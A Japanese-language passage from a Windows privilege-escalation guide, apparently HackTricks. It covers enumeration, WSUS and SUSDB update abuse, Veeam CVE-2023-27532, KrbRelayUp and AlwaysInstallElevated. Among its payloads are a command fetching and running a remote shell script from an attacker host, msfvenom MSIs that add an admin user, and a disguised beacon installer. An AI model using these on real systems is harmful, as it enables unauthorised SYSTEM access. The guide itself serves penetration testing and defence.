# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows のローカル権限昇格ベクトルを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、いくつかの基礎的なガイドにある Windows 権限昇格の一般的な手法をまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な列挙の流れには、コミュニティのワークショップやチェックリストも取り入れています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の攻撃手法の資料には、Windows 権限昇格に関する DerbyCon のプレゼンテーションも含まれます。<sup>[[5]](#references)</sup>

## Windows の基礎理論

### Access Tokens

**Windows の access token について知らない場合は、続ける前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL - DACLs/SACLs/ACEs

**ACL - DACLs/SACLs/ACEs の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity level について知らない場合は、続ける前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、**システムの列挙や実行ファイルの実行を妨げたり、活動を検知したりする**さまざまな仕組みがあります。権限昇格の列挙を始める前に、以下の**ページを読み**、これらの**防御メカニズム**をすべて**列挙してください**。


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインでの UEFI NVRAM 編集を、起動前 DMA と Windows `SYSTEM` メモリのパッチ適用チェーンに発展させることもできます:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess によるサイレントな権限昇格

`RAiLaunchAdminProcess` 経由で起動した UIAccess プロセスは、AppInfo のセキュアパスチェックを回避すると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection バイパス手順はこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop のアクセシビリティレジストリ伝播を悪用すると、任意の SYSTEM レジストリ書き込み（RegPwn）が可能です:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows ビルドでは、特権を持つローカル NTLM 認証が再利用された SMB TCP 接続経由で反射される、**SMB 任意ポート**を利用した LPE 経路も導入されました:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性があるか確認してください（適用済みのパッチも確認してください）。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### バージョン別 Exploits

Microsoft のセキュリティ脆弱性に関する詳細情報を検索するには、この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)が便利です。このデータベースには4,700件を超えるセキュリティ脆弱性が登録されており、Windows 環境が抱える**巨大な攻撃対象領域**を示しています。

**システム上で**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS ビルド、インストール済みの更新プログラム、および候補となるアドバイザリを列挙します。結果が該当するものとして扱う前に、正確な製品と後続の更新プログラムを確認してください。

バージョン固有のローカル exploit を調べる場合は、OS のアーキテクチャだけでなく、**実行中のプロセスのアーキテクチャ**も確認してください。64-bit Windows では、32-bit プロセスに[WOW64 ファイルシステム リダイレクト](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)が適用されます。通常、`%windir%\System32` は 32-bit システムディレクトリを指し、`%windir%\Sysnative` を使うと、そのプロセスからネイティブのシステムディレクトリにアクセスできます。このエイリアスは 64-bit プロセスでは使用できません。OS ビルドや不足している KB の候補だけでは、exploit が実行可能であるとは証明できません。実行中のビルド、インストール済みまたは後続の更新プログラム、プロセスのアーキテクチャ、および exploit の前提条件を、該当する問題に関する[Microsoft のセキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照らし合わせてください。

**システム情報を使ってローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**exploit の Github リポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に credential/Juicy 情報が保存されていますか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShellの履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell のトランスクリプトファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で有効化する方法を確認できます。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` はあくまで例です。[PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) は通常、各ユーザーの Documents フォルダーに書き込みますが、`OutputDirectory` 設定または `Start-Transcript -OutputDirectory` によって、共有フォルダーや隠しフォルダーにファイルをリダイレクトできます。transcript を確認する前に、実際の出力先とファイルの ACL を確認してください。transcript には、資格情報を含むコマンド引数や出力が記録されている場合があります。読み取り可能な transcript が手がかりになるのは、その内容から利用可能な高権限の ID が明らかになり、かつその ID で該当するコンテキストにログオンできる場合に限られます。

### PowerShell Module Logging

PowerShell pipeline の実行に関する詳細が記録されます。これには、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、「Powershell Transcription」ではなく **「Module Logging」** を選択してください。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowerShell のログから最後の15件のイベントを表示するには、次を実行します:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行時に、そのアクティビティと完全な内容が記録され、コードの各ブロックが実行時にすべて文書化されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジックや悪意のある動作の分析に役立ちます。すべてのアクティビティを実行時に記録することで、プロセスに関する詳細な分析情報が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のログイベントは、Windows イベント ビューアーの次のパスにあります: **アプリケーションとサービス ログ > Microsoft > Windows > PowerShell > Operational**。\
直近の20件のイベントを表示するには、次を使用します:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP の WSUS endpoint は、更新メタデータの interception を調査する手掛かりになります。悪用できるかどうかは、クライアントがその WSUS サーバーを使用しているか、攻撃者がその通信を傍受または制御できるか、さらにクライアントの更新に関する信頼設定とインストールポリシーにも左右されます。URL だけではコード実行が可能とは判断できません。[Microsoft は WSUS メタデータに TLS を推奨しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

まず、cmd で次のコマンドを実行し、ネットワークが SSL を使用しない WSUS 更新を使っているか確認します:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または、PowerShell では次のようにします:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような返信を受け取った場合：

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合。

`UseWUServer` が `1` の場合、Windows Update は設定されたイントラネットサービスを使用します。これは HTTP interception を行うための前提条件を確認するものですが、interception、悪意のある更新プログラムの受け入れ、または昇格された権限でのインストールが可能であることを証明するものではありません。`0` の場合、このポリシーで設定された WSUS エンドポイントは選択されません。

この脆弱性を悪用するには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、非SSLのWSUSトラフィックに「偽の」更新プログラムを挿入する、MiTM用のweaponized exploitスクリプトです。

調査資料はこちらです。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なレポートはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本的に、このバグが悪用するのは次の欠陥です。

> ローカルユーザーのプロキシを変更でき、Windows UpdatesがInternet Explorerの設定で構成されたプロキシを使用する場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自分のトラフィックをinterceptし、アセット上で昇格されたユーザーとしてコードを実行できます。
>
> さらに、WSUSサービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUSホスト名の自己署名証明書を生成し、この証明書を現在のユーザーの証明書ストアに追加すると、HTTPとHTTPSの両方のWSUSトラフィックをinterceptできるようになります。WSUSには、証明書に対するtrust-on-first-use型の検証を実装するHSTSのような仕組みはありません。提示された証明書がユーザーによって信頼され、正しいホスト名を持つ場合、サービスはその証明書を受け入れます。

[**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（公開され次第）を使って、この脆弱性を悪用できます。

### WSUS管理者が制御する更新プログラム

現在のIDがWSUSサーバー上で更新プログラムを**公開および承認**できる場合は、別の経路が存在します。サーバーの`WSUS Administrators`グループへの実効的な所属状況と、委任されたWSUS権限を確認し、承認された更新プログラムを受け取るクライアントコンピューターグループを特定してください。[Microsoftでは更新プログラムの承認にWSUS Administrator権限が必要とされています](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)。また、[公開コンテンツに関する信頼関係](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)も文書化されており、クライアントはローカルで公開されたコンテンツに使用される署名証明書を信頼する必要があります。これを権限昇格の経路とみなす前に、候補の更新プログラムが署名され、受け入れられ、対象に適用可能であり、より高い権限のコンテキストでインストールされることを確認してください。HTTPの`WUServer`値やグループ名だけでは、これらの条件が満たされているとは言えません。

### SUSDBのカスタム更新プログラムの悪用：`.txt`/`.esd`経由の未署名ペイロード

これはHTTP WSUS接続のinterceptionとは異なる信頼境界の欠陥です。前提条件は、カスタム更新プログラムを公開および承認できるだけの**WSUSデータベース（`SUSDB`）ストアドプロシージャへのアクセス権**です。実用的な侵入経路の一つは、上流WSUSのコンピューターアカウントを、`SUSDB`をホストする別のMSSQLサーバーにリレーする方法です。必要な前提条件はデプロイ環境によって異なるため、SQL管理者権限があると決めつけず、まず`EXECUTE`権限を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

WSUSクライアント認証をHTTP/8530からLDAP、SMB、またはAD CSにリレーする別の攻撃経路については、[NTLM relayのためのWSUS HTTPの悪用](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)を参照してください。

#### 更新プログラムを作成、対象指定、承認する

カスタム更新プログラムのワークフローでは、制限付きの公開APIとして正規のWSUSプロシージャを使用します。重要な状態遷移は次のとおりです。<sup>[[38]](#references)</sup>

| 段階 | 関連するストアドプロシージャ |
| --- | --- |
| 更新プログラムのメタデータをインポート | `spImportUpdate` |
| 前提条件、ローカライズ済みXMLフラグメント、拡張XMLフラグメントを保存 | `spSaveXMLFragment` |
| コンテンツのdigestを攻撃者が制御するURLに関連付け | `spSetBatchURL` |
| コンピューターグループを列挙/作成し、クライアントを追加 | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| そのグループに対するインストールを承認 | `@actionID = 0`および`@isAssigned = 1`を指定した`spDeployUpdate` |

ファイル名、digest、サイズ、および`CommandLineInstallation`ハンドラーは、インポートしたメタデータ/フラグメント間で一致している必要があります。コンテンツURLと対象グループを割り当てた後、最終的な承認は以下のようになります。例のGUIDを再利用せず、新しい更新プログラム、グループ、デプロイメントの識別子を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子による署名バイパス

WSUS は通常、署名のない任意の実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` では、.NET の `VerifyFile` パスが、指定されたファイル名の末尾が `.txt` または `.esd` の場合に証明書チェックフラグを false に設定します。そのため、バイト列がテキストであることや、正規の ESD イメージであることを事前に確認せずに `CheckCertificateSignature` がスキップされます。したがって、たとえば `payload.exe.txt` という名前の変更されていない PE は、コンテンツ検証を通過し、後に更新プログラムのコマンドラインインストールハンドラーによって起動される可能性があります。これは署名偽造ではなく、ポリシーと型の混同によるバグです。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS互換のステージングと自動化

`spDeployUpdate`を呼び出すと、WSUSは登録済みコンテンツを取得します。配信元はBITSのHTTP要件を満たす必要があります。到達可能なURLだけでは不十分で、転送では最初に`HEAD`/`GET`フローが実行され、バイト範囲リクエストが使われるためです。Rangeをサポートしないサーバーでは、BITSにRangeプロトコルヘッダーが必要であることを示すWSUS同期の`EventId=364`が発生します。<sup>[[39]](#references)</sup>

調査用PoCの[NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)は、インポート/フラグメント/URL/グループ/デプロイの一連の処理に必要なSQLを生成し、その実行用に改変したMSSQLクライアントを含み、コンテンツのステージング用に`BitsWebServer.py`も提供します。認可済みラボでの最小限の実行例は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### unattended execution と retry による永続化

クライアント側の動作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を設定すると、承認済みの更新プログラムがダウンロードされ、設定されたスケジュールに従ってインストールされます。ユーザーが手動で選択する必要はありません。テストでは、更新が失敗または未完了のままの payload は、callback プロセスの終了後すぐに再度提示されました。そのため retry 動作が、繰り返し実行される永続化につながる可能性があります。ただし、クライアントに更新失敗の状態が表示されるため、目立ちます。<sup>[[39]](#references)</sup>

#### 検知と hardening のポイント

この攻撃チェーンで有用なサーバー側およびクライアント側の確認ポイントは次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査します。新しいターゲットグループ、外部コンテンツの配信元、`.txt`/`.esd` の更新 payload、および想定外の主体（特にコンピューターアカウント以外）によるデプロイを調査します。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、および `EventId=364` を確認します。拡張子を信用せず、検証結果を payload の拡張子やコンテンツのマジックナンバーと照合します。
- Windows Update のインストールが繰り返し失敗・再試行されていないか、また `.txt` や `.esd` という名前のコンテンツから PE が実行されたり、予期しない子プロセスやネットワーク通信が発生したりしていないかを調査します。
- 対応している場合は、データベースサービスで Extended Protection for Authentication を必須にし、データベースへのネットワークアクセスを WSUS サーバーと許可された管理システムに制限します。カスタム更新手順に対する `EXECUTE` 権限は最小限にし、監査します。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くのエンタープライズエージェントは、localhost の IPC インターフェースと特権付きの更新チャネルを公開しています。登録先を攻撃者のサーバーに誘導でき、アップデーターが不正な root CA を信頼するか、署名者の検証が弱い場合、ローカルユーザーは悪意のある MSI を配信し、SYSTEM サービスにインストールさせることができます。一般化した手法（Netskope stAgentSvc の攻撃チェーン – CVE-2025-0309 に基づく）はこちらを参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 経由で SYSTEM)

Veeam Backup & Replication と Cloud Connect は、デフォルトで **TCP/9401** 上のコアバックアップサービスを使用します。[Veeam のアドバイザリ](https://www.veeam.com/kb4424) では、バックアップネットワークの境界内において、暗号化された構成データベースの認証情報が認証なしで開示される問題が説明されています。また、別の公開 PoC では、**NT AUTHORITY\SYSTEM** としてコマンドを実行する経路が示されています。<sup>[[12]](#references)</sup> サービスは localhost 以外にも bind する場合があるため、実際のアドレスと PID を確認してください。

- **Recon**: TCP/9401 が `Veeam.Backup.Service.exe` に属していることを確認し、インストール済みの製品とパッチのメタデータを調べます。`netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手掛かりになりますが、完全なパッチ確認にはなりません。
- **修正済みバージョンの下限**: Veeam は、最初の修正済みリリースとして **11a build 11.0.1.1261 P20230227** と **12 build 12.0.0.1420 P20230223** を挙げています。それ以前のリリースは影響を受けます。4 部構成のファイルバージョンだけでは、同じビルド番号の未パッチのベースビルドと後続パッチを区別できません。境界となるビルドを修正済みと判断する前に、[ベンダーのビルド履歴](https://www.veeam.com/kb2680)でパッチ識別子を確認してください。
- **Exploit**: `VeeamHax.exe` などの PoC と必要な Veeam DLL を同じディレクトリに配置し、ローカルソケット経由で SYSTEM payload を実行します。

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

引用された PoC は、追加の前提条件を満たす場合に SYSTEM としてコマンドを実行できることを示しています。ベンダーのアドバイザリでは、認証情報の漏えいに関する問題が説明されています。
## KrbRelayUp

適切な COM server が認証を行い、relay された principal が対象オブジェクトへの書き込み権限を持つ場合、ローカル Kerberos relay により、低権限のログオンから特権ディレクトリへの書き込みが可能になることがあります。[KrbRelay のドキュメント](https://github.com/cube0x0/KrbRelay)では、RBCD と `msDS-KeyCredentialLink`（shadow-credential）の LDAP 書き込みが扱われており、KrbRelayUp はこれらの経路の一部を自動化します。RBCD のチェーンには、該当する委任設定と対象オブジェクトへの権限が必要です。一方、shadow-credential のチェーンには、key-credential の書き込み権限と、証明書認証経路をサポートする KDC が必要です。どちらの経路も、ドメインメンバーであることだけでは成立しません。

実際の DC の [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) と [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) のポリシー、relay される ID のオブジェクト ACL、選択した COM class の認証レベルと偽装レベルを確認してください。呼び出し元のログオンタイプと認証情報のコンテキストも重要です。WinRM セッションは、対話型ログオンや新しい資格情報でのログオンとは異なる動作をすることがあります。ファイアウォール/OXID のルーティングやインストール済みの更新プログラムによっても結果が変わる場合があります。ポリシーが緩い、または ACL が一致する場合は、レビュー対象として扱ってください。受動的な列挙によって COM coercion、relay 認証、ディレクトリ書き込みを発生させてはいけません。マシンアカウントの shadow credential はマシンチケットにつながる可能性があり、そのアカウントに必要なディレクトリ複製権限がある場合に限り、別途 DCSync への経路となることがあります。

**exploit は** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) **にあります**

攻撃の流れについては、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>を確認してください。

## AlwaysInstallElevated

**これら 2 つのレジストリキーが** **有効**（値が **0x1**）になっている**場合**、どの権限レベルのユーザーでも `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

meterpreter session がある場合は、モジュール **`exploit/windows/local/always_install_elevated`** を使ってこの手法を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使うと、権限昇格用の Windows MSI バイナリを現在のディレクトリに作成できます。このスクリプトは、ユーザーまたはグループの追加を促すプリコンパイル済みの MSI インストーラーを書き出します（そのため GUI アクセスが必要です）。

```
Write-UserAddMSI
```

作成した binary を実行して privilege escalation します。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法は、こちらのチュートリアルを読んでください。**コマンドラインを実行する**だけでよい場合は、「**.bat**」ファイルをラップできます。

{{#ref}}
msi-wrapper.md
{{#endref}}

### WIXでMSIを作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual StudioでMSIを作成

- Cobalt Strike または Metasploit を使って、新しい **Windows EXE TCP payload** を `C:\privesc\beacon.exe` に**生成**します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに「installer」と入力します。**Setup Wizard** プロジェクトを選択し、**Next** をクリックします。
- プロジェクト名（例: **AlwaysPrivesc**）を指定し、場所に **`C:\privesc`** を使用します。**place solution and project in the same directory** を選択して、**Create** をクリックします。
- ステップ 3/4（含めるファイルの選択）が表示されるまで **Next** をクリックします。**Add** をクリックし、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
  - **Author** や **Manufacturer** など、インストールしたアプリをより正規のものに見せるために変更できるプロパティもあります。
- プロジェクトを右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、インストーラーの実行直後に Beacon payload が実行されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更します。
- 最後に、**ビルドします**。
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、プラットフォームが x64 に設定されていることを確認してください。

### MSIのインストール

悪意のある `.msi` ファイルをバックグラウンドで**インストール**するには:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

この脆弱性を悪用するには、_exploit/windows/local/always_install_elevated_ を使用できます。

## Antivirus and Detectors

### Audit Settings

これらの設定によって**ログに記録される内容**が決まるため、注意してください。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwardingでは、ログの送信先を把握しておくとよい。

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**は、ドメインに参加しているコンピューター上の**ローカル Administrator パスワードを管理**するために設計されており、各パスワードが**一意でランダムに生成され、定期的に更新される**ようにします。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、許可されたユーザーはローカル管理者パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページで WDigest の詳細を確認できます**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** から、Microsoft は Local Security Authority（LSA）の保護を強化し、信頼されていないプロセスによる**メモリの読み取り**やコードの注入を**ブロック**して、システムの安全性をさらに高めました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威から、デバイスに保存された認証情報を保護することです。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### キャッシュされた資格情報

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって使用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループに興味深い権限がないか確認しましょう。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限昇格できる可能性があります**。特権グループと、それを悪用して権限昇格する方法については、こちらをご覧ください。


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### トークン操作

このページで**トークン**とは何かについて**詳しく学べます**：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
次のページで、**興味深いトークン**とその悪用方法について学んでください。


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログインユーザー / セッション

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーの権限

